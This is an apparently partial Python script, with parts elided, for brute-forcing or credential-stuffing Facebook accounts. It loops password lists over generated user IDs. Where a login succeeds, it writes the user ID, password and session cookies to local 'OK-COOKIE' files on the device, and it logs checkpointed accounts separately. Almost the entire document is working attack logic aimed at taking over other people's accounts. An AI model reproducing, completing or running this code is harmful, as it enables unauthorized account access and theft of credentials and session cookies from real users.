...
def maink(kns):
       ...
       clear()
       print(f"{h1} START CRACK MIX FILE")
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           print(f"\r\r{a}↳{w}[{a}XYN-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/XYN-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/XYN-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}XYN-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/XYN-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/XYN-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
...
def rndxd():
        ...
        for number in range(LIMIT):
                ...
                numbr.append(nmp)
        clear()
        print(f"{h1} METHOD {I} A {w}[{a}MIX ACCOUNT{w}]")
        print(f"{h2} METHOD {I} B {w}[{a}BEST METHOD{w}]");linex()
        ho = input(f"{h} ENTER METHOD {I2} ")
        if ho in ['a','A','1','01']:mtd.append("A")
        elif ho in ['b','B','2','02']:mtd.append("B")
        else:mtd.append("A")
...
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}XYN-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}XYN-💙{w}] {a}{uid} {I} {ps}")
                            ...
                            #print(f"\r\r\033[1;90m ↳[XYN-CP] {uid} ━➤ {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
